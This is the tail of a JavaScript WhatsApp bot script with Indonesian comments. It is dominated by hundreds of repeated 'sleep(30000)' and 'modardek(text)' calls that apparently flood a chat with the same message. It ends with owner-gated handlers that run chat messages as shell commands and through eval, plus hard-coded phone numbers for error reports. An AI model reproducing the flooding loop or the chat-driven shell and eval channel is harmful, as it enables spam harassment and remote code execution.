await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
}
}
break

//++++++++++++++ END CASE +++++++++++++++
default:
//AUTO REACT GW MATIIN, GANGGU.
/*if (budy.includes('gabut') || budy.includes('hehe') || budy.includes('apa')) {
	let mojii = ["🤧","🤨","🗿","🤪","🤫","🤬","🤭","🤮","🤯","🤟","🤠","🤡","🤢","🤣","🤤","🤥","🤐","🤑","🤒","🤓","🤔","🤕","🤖","🤗"]
			let ran = mojii[Math.floor(Math.random() * mojii.length)]
const reactionMessage = {
    react: {
        text: ran, // use an empty string to remove the reaction
        key: m.key
    }
}

conn.sendMessage(from, reactionMessage)
	}
if ((m.mtype === 'reactionMessage') && m.isGroup) {
    conn.sendMessage(from, {text: `Terdeteksi *${m.pushName} @${m.sender.split("@")[0]}* Mengirim Reaction.`, mentions: [m.sender]}, {quoted: fake})
        }
        
        if ((m.mtype === 'groupInviteMessage' || budy.startsWith('https://chat') || budy.startsWith('Buka tautan ini')) && !m.isBaileys && !m.isGroup) {
        	let buttons = [
                    {buttonId: `owner`, buttonText: {displayText: '𝑶𝑾𝑵𝑬𝑹 𝑩𝑶𝑻'}, type: 1}
                ]
			conn.sendMessage(from, {text:`INVITE DETECT\n\nMau masukin bot ini ke group kamu?`, title: 'LINK GROUP DECTETED', footer: '© 2022 Fadhil Graphy', buttons: buttons, headerType: 5})
		} */
       /* if (m.mtype === 'stickerMessage') {
        	const reactionMessage = {
    react: {
        text: '🌚', // use an empty string to remove the reaction
        key: m.key
    }
} 

conn.sendMessage(from, reactionMessage)
}*/
if (budy.startsWith("$") && isCreator) {
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) m.reply(`${stdout}`.trim())
})
}
if (budy.startsWith('>')) {
	if (!isCreator) return m.reply('gamau')
	try {
		let evaled = await eval(budy.slice(2))
		if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
		await m.reply(evaled)
	} catch (err) {
		await m.reply(String(err))
	}
}
if (budy.startsWith(`=>`)) {
try {
	if (!isCreator) return m.reply(act.owner)
conn.sendMessage(from, { text: util.format(eval(`( async () => { return ${body.slice(3)}})()`))}, { quoted: m})
} catch (e) {
print(e)
conn.sendMessage(`687909979@s.whatsapp.net`, { text: String(e) }, { quoted: m})
}
}
}
} catch(e) {
conn.sendMessage(`6283834027073@s.whatsapp.net`, {text: `Command Error Om\n\n[x] Error Log:\n${e}`})
print(`[x] Error: ${e}`.red)
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update!`), chalk.yellow(`${__filename}`))
	delete require.cache[file]
	require(file)
})
